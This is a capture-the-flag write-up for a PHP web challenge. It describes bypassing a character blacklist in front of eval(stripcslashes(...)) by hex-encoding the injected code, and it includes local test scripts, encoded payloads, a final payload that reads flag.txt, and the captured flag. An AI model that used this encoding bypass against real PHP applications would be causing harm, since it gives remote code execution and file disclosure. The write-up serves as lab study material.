At first looking at this level I thought about passing file_get_contents a php filter, and I should pass base64 encoded string to the file and boom RCE.
I tested it like this:

```
<?php
$s = "ZWNobyAibWF0dGkiOw==";
$x = 'php://filter/read=convert.base64-decode/resource=/workspace/test';
$s = str_replace (
                ['<?', '?>', '"', "'", '$', '&', '|', '{', '}', ';', '#', ':', '#', ']', '[', ',', '%', '(', ')'],
                '',
                $s
);
echo $s . "\n";
file_put_contents('/workspace/test', $s);
print_r(file_get_contents ($x) . "\n");

echo eval (stripcslashes (file_get_contents ($x)));
?>
```

And everything worked locally, but when I tried it on the site nothing happened.
After some time I realised this doesn't the ```file_exists()``` check...
I tried to play with it some more but file_exists doesn't work with php://filter, only with php://temp or php://memory because they are the only ones who implement stat.

I then tried to approach a different function - ```stripcslashes()``` and saw in it's documentation that it says:
```Returns a string with backslashes stripped off. Recognizes C-like \n, \r ..., octal and hexadecimal representation.```
The hexadecimal and octal part caught my eye, so I tested it locally like this:
```
$s = "\\x65\\x63\\x68\\x6F\\x20\\x22\\x70\\x77\\x6E\\x65\\x64\\x22\\x3B";
$x = '/workspace/test';
$s = str_replace (
                ['<?', '?>', '"', "'", '$', '&', '|', '{', '}', ';', '#', ':', '#', ']', '[', ',', '%', '(', ')'],
                '',
                $s
);
echo $s . "\n";
file_put_contents('/workspace/test', $s);
print_r(file_get_contents ($x) . "\n");
if (file_exists($x)){
    echo eval (stripcslashes (file_get_contents ($x)));
}
else {
    echo "not found";
}
```
And what do you know, I get printed: pwned :)

I then tried it on the site, passing it ```\x70\x72\x69\x6E\x74\x5F\x72\x28\x22\x70\x77\x6E\x65\x64\x22\x29\x3B``` as c and then accessed it with the cookie and what do you know, I got printed pwned :) 

final payload ```print_r(file_get_contents('flag.txt'));``` ==> ```\x70\x72\x69\x6E\x74\x5F\x72\x28\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73\x28\x27\x66\x6C\x61\x67\x2E\x74\x78\x74\x27\x29\x29\x3B```

And then I get the flag: WEBSEC{stripcslashes_to_bypass}